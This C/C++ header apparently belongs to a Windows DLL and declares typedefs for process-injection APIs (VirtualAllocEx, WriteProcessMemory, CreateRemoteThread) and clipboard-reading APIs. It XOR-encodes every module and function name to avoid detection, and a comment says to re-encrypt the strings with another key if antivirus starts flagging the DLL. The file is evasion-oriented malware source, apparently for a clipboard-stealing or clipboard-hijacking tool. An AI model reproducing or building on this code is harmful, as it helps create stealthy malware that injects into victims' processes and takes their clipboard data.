#pragma once
#include "pch.h"

// kernel32
typedef HANDLE(WINAPI *MyOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef LPVOID(WINAPI *MyVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *MyWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef BOOL(WINAPI *MyReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef BOOL(WINAPI *MyVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef BOOL(WINAPI *MyVirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef HANDLE(WINAPI *MyGetCurrentProcess)(void);
typedef HANDLE(WINAPI *MyCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI *MyWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL(WINAPI *MyCloseHandle)(HANDLE hObject);
typedef LPVOID(WINAPI *MyGlobalLock)(_In_ HGLOBAL hMem);
typedef BOOL(WINAPI *MyGlobalUnlock)(_In_ HGLOBAL hMem);

// If the antivirus starts detecting your DLL, consider re-encrypting these strings with another key.

typedef BOOL(WINAPI *MyOpenClipboard)(_In_opt_ HWND hWndNewOwner);
typedef BOOL(WINAPI *MyCloseClipboard)(VOID);
typedef HANDLE(WINAPI *MyGetClipboardData)(_In_ UINT uFormat);
typedef DWORD(WINAPI *MyGetClipboardSequenceNumber)(VOID);

#define XOR_KEY 'G'

#define MODULE_KERNEL32				L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B"
#define MODULE_USER32				L"\x32\x34\x22\x35\x74\x75\x69\x23\x2B\x2B"

// kernel32
#define	PROC_OpenProcess			"\x08\x37\x22\x29\x17\x35\x28\x24\x22\x34\x34"
#define PROC_VirtualAllocEx			"\x11\x2E\x35\x33\x32\x26\x2B\x06\x2B\x2B\x28\x24\x02\x3F"
#define PROC_WriteProcessMemory		"\x10\x35\x2E\x33\x22\x17\x35\x28\x24\x22\x34\x34\x0A\x22\x2A\x28\x35\x3E"
#define PROC_ReadProcessMemory		"\x15\x22\x26\x23\x17\x35\x28\x24\x22\x34\x34\x0A\x22\x2A\x28\x35\x3E"
#define PROC_VirtualProtectEx		"\x11\x2E\x35\x33\x32\x26\x2B\x17\x35\x28\x33\x22\x24\x33\x02\x3F"
#define PROC_VirtualFreeEx			"\x11\x2E\x35\x33\x32\x26\x2B\x01\x35\x22\x22\x02\x3F"
#define PROC_GetCurrentProcess		"\x00\x22\x33\x04\x32\x35\x35\x22\x29\x33\x17\x35\x28\x24\x22\x34\x34"
#define PROC_CreateRemoteThread		"\x04\x35\x22\x26\x33\x22\x15\x22\x2A\x28\x33\x22\x13\x2F\x35\x22\x26\x23"
#define PROC_WaitForSingleObject	"\x10\x26\x2E\x33\x01\x28\x35\x14\x2E\x29\x20\x2B\x22\x08\x25\x2D\x22\x24\x33"
#define PROC_CloseHandle			"\x04\x2B\x28\x34\x22\x0F\x26\x29\x23\x2B\x22"
#define PROC_BaseThreadInitThunk	"\x05\x26\x34\x22\x13\x2F\x35\x22\x26\x23\x0E\x29\x2E\x33\x13\x2F\x32\x29\x2C"
#define PROC_GlobalLock				"\x00\x2B\x28\x25\x26\x2B\x0B\x28\x24\x2C"
#define PROC_GlobalUnlock			"\x00\x2B\x28\x25\x26\x2B\x12\x29\x2B\x28\x24\x2C"

// user32
#define PROC_OpenClipboard				"\x08\x37\x22\x29\x04\x2B\x2E\x37\x25\x28\x26\x35\x23"
#define PROC_GetClipboardData			"\x00\x22\x33\x04\x2B\x2E\x37\x25\x28\x26\x35\x23\x03\x26\x33\x26"
#define PROC_CloseClipboard				"\x04\x2B\x28\x34\x22\x04\x2B\x2E\x37\x25\x28\x26\x35\x23"
#define PROC_GetClipboardSequenceNumber	"\x00\x22\x33\x04\x2B\x2E\x37\x25\x28\x26\x35\x23\x14\x22\x36\x32\x22\x29\x24\x22\x09\x32\x2A\x25\x22\x35"
